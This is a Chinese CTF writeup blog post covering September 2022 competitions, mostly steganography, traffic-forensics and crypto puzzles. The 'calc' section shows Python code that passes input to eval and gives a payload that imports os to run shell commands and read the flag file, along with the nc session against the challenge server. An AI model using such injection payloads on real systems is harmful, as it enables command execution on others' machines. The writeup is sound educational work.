<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>2022年9月比赛writeups | Valen的博客</title><meta name="keywords" content="ctf,writeup"><meta name="author" content="Valen"><meta name="copyright" content="Valen"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="2022年9月比赛writeups2022年第三届电信和互联网行业职业技能竞赛2022年第三届电信和互联网行业职业技能竞赛 Broken Radio没出，蹲不到wp calc题目附件代码 12345678910111213141516171819202122232425262728293031323334353637key&#x3D;&quot;[HIDDEN]&quot;def calc():    li">
<meta property="og:type" content="article">
<meta property="og:title" content="2022年9月比赛writeups">
<meta property="og:url" content="https://0314valen.github.io/article/2022-10-01-2022%E5%B9%B49%E6%9C%88%E6%AF%94%E8%B5%9Bwriteups/index.html">
<meta property="og:site_name" content="Valen的博客">
<meta property="og:description" content="2022年9月比赛writeups2022年第三届电信和互联网行业职业技能竞赛2022年第三届电信和互联网行业职业技能竞赛 Broken Radio没出，蹲不到wp calc题目附件代码 12345678910111213141516171819202122232425262728293031323334353637key&#x3D;&quot;[HIDDEN]&quot;def calc():    li">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://api.btstu.cn/sjbz/">
<meta property="article:published_time" content="2022-09-30T16:00:00.000Z">
<meta property="article:modified_time" content="2022-11-10T09:47:56.389Z">
<meta property="article:author" content="Valen">
<meta property="article:tag" content="ctf">
<meta property="article:tag" content="writeup">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://api.btstu.cn/sjbz/"><link rel="shortcut icon" href="/image/UI_images/favicon.png"><link rel="canonical" href="https://0314valen.github.io/article/2022-10-01-2022%E5%B9%B49%E6%9C%88%E6%AF%94%E8%B5%9Bwriteups/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: {"defaultEncoding":1,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简"},
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: undefined,
  lightbox: 'mediumZoom',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#2d3035","position":"bottom-left"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '2022年9月比赛writeups',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2022-11-10 17:47:56'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 5.4.2"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/image/UI_images/avatar.jpg" onerror="onerror=null;src='/image/UI_images/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">39</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">29</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">19</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 工具</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/CyberChef/"><i class="fa-fw fas fa-music"></i><span> CyberChef</span></a></li><li><a class="site-page child" href="/Linux-command/"><i class="fa-fw fas fa-video"></i><span> Linux命令大全</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('http://api.btstu.cn/sjbz/')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Valen的博客</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 工具</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/CyberChef/"><i class="fa-fw fas fa-music"></i><span> CyberChef</span></a></li><li><a class="site-page child" href="/Linux-command/"><i class="fa-fw fas fa-video"></i><span> Linux命令大全</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">2022年9月比赛writeups</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-09-30T16:00:00.000Z" title="发表于 2022-10-01 00:00:00">2022-10-01</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-11-10T09:47:56.389Z" title="更新于 2022-11-10 17:47:56">2022-11-10</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/writeup/">writeup</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">2.9k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>13分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="2022年9月比赛writeups"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="2022年9月比赛writeups"><a href="#2022年9月比赛writeups" class="headerlink" title="2022年9月比赛writeups"></a>2022年9月比赛writeups</h1><h2 id="2022年第三届电信和互联网行业职业技能竞赛"><a href="#2022年第三届电信和互联网行业职业技能竞赛" class="headerlink" title="2022年第三届电信和互联网行业职业技能竞赛"></a>2022年第三届电信和互联网行业职业技能竞赛</h2><p><a href="/image/media/2022/ctf/2022.09/9%E6%9C%88%E6%AF%94%E8%B5%9B%E9%99%84%E4%BB%B6/2022%E5%B9%B4%E7%AC%AC%E4%B8%89%E5%B1%8A%E7%94%B5%E4%BF%A1%E5%92%8C%E4%BA%92%E8%81%94%E7%BD%91%E8%A1%8C%E4%B8%9A%E8%81%8C%E4%B8%9A%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9B.zip">2022年第三届电信和互联网行业职业技能竞赛</a></p>
<h3 id="Broken-Radio"><a href="#Broken-Radio" class="headerlink" title="Broken Radio"></a>Broken Radio</h3><p>没出，蹲不到wp</p>
<h3 id="calc"><a href="#calc" class="headerlink" title="calc"></a>calc</h3><p>题目附件代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">key=&quot;[HIDDEN]&quot;</span><br><span class="line"></span><br><span class="line">def calc():</span><br><span class="line">    line = input(&quot; &gt;&gt;&gt; &quot;)</span><br><span class="line">    if(len(line)&gt;9):</span><br><span class="line">        return print(&quot;500 Internal Server Error\n&quot;)</span><br><span class="line">    try:</span><br><span class="line">        print(eval(line))</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br><span class="line"></span><br><span class="line">def supper_calc():</span><br><span class="line">    print(&quot;Please enter the invitation code&quot;)</span><br><span class="line">    code = input(&quot; &gt;&gt;&gt; &quot;)</span><br><span class="line">    if(code == key):</span><br><span class="line">        line = input(&quot; &gt;&gt;&gt; &quot;)</span><br><span class="line">        try:</span><br><span class="line">            print(eval(line))</span><br><span class="line">        except:</span><br><span class="line">            pass</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;403 Forbidden\n&quot;)</span><br><span class="line">        </span><br><span class="line">while(1):</span><br><span class="line">    print(&quot;What do you want?&quot;)</span><br><span class="line">    print(&#x27;1.clac&#x27;)</span><br><span class="line">    print(&#x27;2.supper clac&#x27;)</span><br><span class="line">    choice = input(&quot;Please input your option &gt;&gt;&gt; &quot;)</span><br><span class="line">    if(choice == &quot;1&quot;):</span><br><span class="line">        calc()</span><br><span class="line">        input(&quot;press any key to continue...&quot;)</span><br><span class="line">    elif(choice == &quot;2&quot;):</span><br><span class="line">        supper_calc()</span><br><span class="line">        input(&quot;press any key to continue...&quot;)</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;404 NOT FOUND\n&quot;)</span><br><span class="line">        input(&quot;press any key to continue...&quot;)</span><br></pre></td></tr></table></figure>

<p>审计代码之后发现有两个选项第一个是calc，然后需要在clac中拿到key，并在supper clac中使用这个key，然后需要注意的是会第一个calc的长度有限制，于是print(eval(line))中使用ssti的payload即可任意命令执行。</p>
<p>可以使用SSTI的payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__builtins__.__dict__[&#x27;__import__&#x27;](&#x27;os&#x27;).system(&#x27;cat /f*&#x27;)</span><br></pre></td></tr></table></figure>

<p>攻击复现</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">└─$ nc 1.14.97.218 29423                       </span><br><span class="line">What do you want?</span><br><span class="line">1.clac</span><br><span class="line">2.supper clac</span><br><span class="line">Please input your option &gt;&gt;&gt;1</span><br><span class="line"> &gt;&gt;&gt;key</span><br><span class="line">0317dcd25f8916b43998be722434ed14</span><br><span class="line">press any key to continue...</span><br><span class="line"></span><br><span class="line">What do you want?</span><br><span class="line">1.clac</span><br><span class="line">2.supper clac</span><br><span class="line">Please input your option &gt;&gt;&gt;2</span><br><span class="line">Please enter the invitation code</span><br><span class="line"> &gt;&gt;&gt;0317dcd25f8916b43998be722434ed14</span><br><span class="line"> &gt;&gt;&gt;__builtins__.__dict__[&#x27;__import__&#x27;](&#x27;os&#x27;).system(&#x27;cat /f*&#x27;)</span><br><span class="line">flag&#123;47031505122527365331894107816314&#125;</span><br><span class="line">0</span><br><span class="line">press any key to continue...</span><br></pre></td></tr></table></figure>

<h3 id="eye"><a href="#eye" class="headerlink" title="eye"></a>eye</h3><p>下载附件可以拿到一个图片，binwalk+foremost得到一个压缩包</p>
<p><img src="/image/media/2022/ctf/2022.09/img/5.png"></p>
<p>可以看到zip里面的文件大小是一样的，所以猜测需要使用后面的crc来爆破</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">工具地址：https://github.com/theonlypwner/crc32</span><br></pre></td></tr></table></figure>

<p>爆破结果（去掉多余的信息）（0x0f84c81e、0x532694fd、0xf2007D19）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">python2 crc32.py reverse 0x0f84c81e</span><br><span class="line">6 bytes: ohhhh_ (OK)</span><br><span class="line">                      </span><br><span class="line">python2 crc32.py reverse 0x532694fd</span><br><span class="line">6 bytes: you_fo (OK)</span><br><span class="line"></span><br><span class="line">python2 crc32.py reverse 0xf2007D19</span><br><span class="line">6 bytes: und_me (OK)</span><br></pre></td></tr></table></figure>

<p>所以得到zip的密码：ohhhh_you_found_me。解压得到密文</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">YzMxZDFmMjNlY2VjNjRhYzI4Y2MxMDM2MDY2ZmEx</span><br></pre></td></tr></table></figure>

<p>base64解密之后得到密文：c31d1f23ecec64ac28cc1036066fa1</p>
<p>根据题目名称可以猜测是不是需要使用silenteye</p>
<p><img src="/image/media/2022/ctf/2022.09/img/6.png"></p>
<p>解密得到flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;b9bb5b2db051d713e307b2b8b98050ae&#125;</span><br></pre></td></tr></table></figure>

<h3 id="降龙十八掌"><a href="#降龙十八掌" class="headerlink" title="降龙十八掌"></a>降龙十八掌</h3><p><a href="/image/media/2022/ctf/2022.09/9%E6%9C%88%E6%AF%94%E8%B5%9B%E9%99%84%E4%BB%B6/%E9%99%8D%E9%BE%99%E5%8D%81%E5%85%AB%E6%8E%8C.zip">降龙十八掌</a></p>
<p>题目附件给了一个apng的图片，可以用浏览器打开看到有动态效果，可以看到有很多不一样的，使用apngdis_gui提取出来，共557张</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apngdis_gui下载地址：http://www.downcc.com/soft/40902.html</span><br></pre></td></tr></table></figure>

<p>查看每一张图片，发现有的图片在圆的圆点部分有一个黑点，RGB值为6，7，8，可以猜测使用这个点组成了什么东西</p>
<p>接下来我们只需要提取这个不一样的像素点就可以了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import  os</span><br><span class="line">from PIL import Image</span><br><span class="line">flag_img = Image.new(&#x27;1&#x27;, (350,400))</span><br><span class="line">path=r&quot;./apng&quot;</span><br><span class="line">for root, dirs, files in os.walk(path):</span><br><span class="line">    for name in files:</span><br><span class="line">        png_path=os.path.join(root, name)</span><br><span class="line">        image = Image.open(png_path)</span><br><span class="line">        image = image.convert(&quot;RGB&quot;)</span><br><span class="line">        width, height = image.size</span><br><span class="line">        for w in range(width):</span><br><span class="line">            for h in range(height):</span><br><span class="line">                if image.getpixel((w, h)) == (6, 7, 8):</span><br><span class="line">                    flag_img.putpixel((h, w), 1)</span><br><span class="line">    flag_img.save(&quot;1.png&quot;)</span><br><span class="line">    flag_img.show()</span><br></pre></td></tr></table></figure>

<p><img src="/image/media/2022/ctf/2022.09/img/apng.png"></p>
<p>反色加标志位</p>
<p><img src="/image/media/2022/ctf/2022.09/img/7.png"></p>
<p>扫码即可得到flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DASCTF&#123;18_palmattacks_to_defeat_dragons&#125;</span><br></pre></td></tr></table></figure>

<h2 id="2022望岳杯"><a href="#2022望岳杯" class="headerlink" title="2022望岳杯"></a>2022望岳杯</h2><p><a href="/image/media/2022/ctf/2022.09/9%E6%9C%88%E6%AF%94%E8%B5%9B%E9%99%84%E4%BB%B6/2022%E6%9C%9B%E5%B2%B3%E6%9D%AF.zip">2022望岳杯misc附件下载地址</a></p>
<h3 id="001MMS-协议"><a href="#001MMS-协议" class="headerlink" title="001MMS 协议"></a>001MMS 协议</h3><p>MMS流量分析，右键追踪tcp流时发现mms流量中有几个不正常的流量</p>
<p><img src="/image/media/2022/ctf/2022.09/img/1.png"></p>
<p>拼接得到@iH&lt;,{)G7O07k7)ScP!3F}A</p>
<p>然后base91解密得到flag</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;3QSZjGU5qey6&#125;</span><br></pre></td></tr></table></figure>

<h3 id="003攻击行为还原"><a href="#003攻击行为还原" class="headerlink" title="003攻击行为还原"></a>003攻击行为还原</h3><p>在crontab文件中发现注释：TVZQVU0zM1NNTlNYMj09PQ==使用base64、base32解密之后得到flag的后半段</p>
<p>e_Force}</p>
<p>然后找到密码的各种参数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#linux\root\.ssh\id_rsa文件中找到</span><br><span class="line">n=1606938044309278499168642398192229212629290234347717645487123</span><br><span class="line">e=65537</span><br><span class="line">#FlaG.txt文件中找到</span><br><span class="line">c=1566077545968868311749088444723100549024925747577903610033503</span><br></pre></td></tr></table></figure>

<p>然后根据算法得到flag前半部分</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from gmpy2 import *</span><br><span class="line">n=1606938044309278499168642398192229212629290234347717645487123</span><br><span class="line">e=65537</span><br><span class="line">c=1566077545968868311749088444723100549024925747577903610033503</span><br><span class="line"></span><br><span class="line">phi = (1267650600235241044365044382487-1)*(1267650600260888172240281085029-1)</span><br><span class="line">d = invert(e,phi)</span><br><span class="line">print(bytes.fromhex(hex(pow(c,d,n))[2:]))</span><br><span class="line"># flag&#123;SSH_Brut</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;SSH_Brute_Force&#125;</span><br></pre></td></tr></table></figure>

<h3 id="004留痕取证"><a href="#004留痕取证" class="headerlink" title="004留痕取证"></a>004留痕取证</h3><p>直接在流量中搜索flag，定位到tcp.stream eq 16</p>
<p><img src="/image/media/2022/ctf/2022.09/img/3.png"></p>
<p>得到flag后面一段字符：ugana}</p>
<p>在tcp流15中发现了特殊字符</p>
<p><img src="/image/media/2022/ctf/2022.09/img/2.png"></p>
<p>1d918f7de272synt{ohshwv但是根据习惯可以知道synt{ohshwv是rot13加密得到flag前面半段flag{bufuji</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;bufujiugana&#125;</span><br></pre></td></tr></table></figure>

<h3 id="005漏洞挖掘"><a href="#005漏洞挖掘" class="headerlink" title="005漏洞挖掘"></a>005漏洞挖掘</h3><p>给的是一个二进制文件，没法直接run需要密码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ ./d5000_login                                                          </span><br><span class="line">**************************D5000 Authentication Module******************************</span><br><span class="line">usage:./d5000_login password</span><br></pre></td></tr></table></figure>

<p>使用IDA分析看到字符串中有特殊字符串用作是密码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">6f73684294324280a40c053404133bec</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ ./d5000_login 6f73684294324280a40c053404133bec        </span><br><span class="line">**************************D5000 Authentication Module******************************</span><br><span class="line">欢迎访问D5000认证模块，正在验证您的密码信息，请稍后...</span><br><span class="line">you have login success!</span><br><span class="line">54656661e280827366617b35302a6f692a6173692a4c6840383268e280826c6769e280826c676430306c676e70732a7344426830317d</span><br></pre></td></tr></table></figure>

<p>得到的字符串使用hex然后栅栏之后得到</p>
<p><img src="/image/media/2022/ctf/2022.09/img/4.png"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The flag is flag&#123;d5000*login*pass*is*DLBhh@0812&#125;</span><br></pre></td></tr></table></figure>

<h3 id="006密文破解"><a href="#006密文破解" class="headerlink" title="006密文破解"></a>006密文破解</h3><p>已有密文的md5：b9fd??9d5??c1?f6c??abd????5ac??7</p>
<p>已有部分数据：?1_1001_10_600_600_??00??7_202103301539</p>
<p>看起来就是爆破五位字符串</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">data = &quot;&#123;&#125;1_1001_10_600_600_&#123;&#125;&#123;&#125;00&#123;&#125;&#123;&#125;7_202103301539&quot;</span><br><span class="line">md5_data = &quot;b9fd??9d5??c1?f6c??abd????5ac??7&quot;</span><br><span class="line">t=&quot;&quot;</span><br><span class="line">for i in range(32,129):#所有可见字符</span><br><span class="line">    t += chr(i)</span><br><span class="line">for i1 in t:</span><br><span class="line">    for i2 in t:</span><br><span class="line">        for i3 in t:</span><br><span class="line">            for i4 in t:</span><br><span class="line">                for i5 in t:</span><br><span class="line">                    tmp = data.format(i1,i2,i3,i4,i5)</span><br><span class="line">                    tmd5 = hashlib.md5(tmp.encode()).hexdigest()</span><br><span class="line">                    if tmd5[:4] == &quot;b9fd&quot; and tmd5[6:9] == &quot;9d5&quot; and tmd5[-1] == &quot;7&quot;:</span><br><span class="line">                        print(tmp)</span><br><span class="line"> </span><br><span class="line"># 1_1001_10_600_600_1500.87_202103301539</span><br></pre></td></tr></table></figure>

<h2 id="2022羊城杯"><a href="#2022羊城杯" class="headerlink" title="2022羊城杯"></a>2022羊城杯</h2><p><a href="/image/media/2022/ctf/2022.09/9%E6%9C%88%E6%AF%94%E8%B5%9B%E9%99%84%E4%BB%B6/%E7%BE%8A%E5%9F%8E%E6%9D%AF.zip">2022羊城杯misc附件下载地址</a></p>
<h3 id="where-is-secret"><a href="#where-is-secret" class="headerlink" title="where_is_secret"></a>where_is_secret</h3><p>文件名vivo50和vig可以知道下面的内容需要维吉尼亚解密</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Naseu bybkjkl, O wt mna Wkkopwkja hl Qrkgeux Fasxtorr. Zdl Kaozbgj hksu oty fblz hhntyoxj wu tzphvq ku Nqnhbta, hgj pox Qupo geyiuna ago ixkj jhtpyhrhlw hu aak Nblyehg gntr. Nahkj pvwgu pl QBJ Vxwgr Zdbkyzhr, O jlxj ovfkkux zk ikojn fk 29.94 bpgmay-layrbtc vkocpggh jaoyrxt wz kgpphto uhc. Soxt E yxvas mna Ynyoptt wyfe, E dbrh pgbeax ekb mu yvfk pv Nqnhbta ah ha aak rpvk lyxyekxtp.aak lhlysvkj ez ZCDA@K1tz0frjo</span><br></pre></td></tr></table></figure>

<p>使用<a target="_blank" rel="noopener" href="https://www.guballa.de/vigenere-solver%E5%BE%97%E5%88%B0%E5%AF%86%E9%92%A5gwht%E5%92%8C%E4%B8%8B%E9%9D%A2%E7%9A%84%E5%AF%86%E7%A0%81">https://www.guballa.de/vigenere-solver得到密钥gwht和下面的密码</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hello friends, I am the President of Ukraine Zelensky. The Russian army has just launched an attack on Ukraine, and the Kyiv airport has been controlled by the Russian army. Heard today is KFC Crazy Thursday, I need someone to bring me 29.94 finger-sucking original chicken as rations now. When I repel the Russian army, I will invite you to come to Ukraine to be the vice president.the password is GWHT@R1nd0yyds</span><br></pre></td></tr></table></figure>

